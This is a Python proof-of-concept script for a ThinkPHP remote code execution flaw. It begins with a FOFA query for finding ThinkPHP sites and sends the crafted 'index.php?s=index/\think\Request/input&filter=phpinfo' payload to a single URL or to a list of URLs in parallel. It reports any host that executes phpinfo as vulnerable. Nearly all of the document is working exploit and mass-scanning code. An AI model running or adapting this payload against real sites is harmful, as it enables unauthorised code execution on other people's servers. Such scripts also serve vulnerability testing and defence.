#FOFA: body="thinkphp" | app="thinkphp" | icon_hash="1165838194"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json
import time

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'thinkphp_request_input_rce',
        'vulnerable': False
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
        vurl = urllib.parse.urljoin(target, 'index.php?s=index/\\think\Request/input&filter=phpinfo&data=1')
        req = requests.get(vurl, headers=headers, timeout=3, verify=False)
        req2 = requests.get(target, headers=headers, timeout=3, verify=False)
        if r"PHP Version" in req.text and r"PHP Version" not in req2.text:
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = target
            result['payload'] = vurl
            print(result)
    except:
        print(f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("Thinkphp输入RCE漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()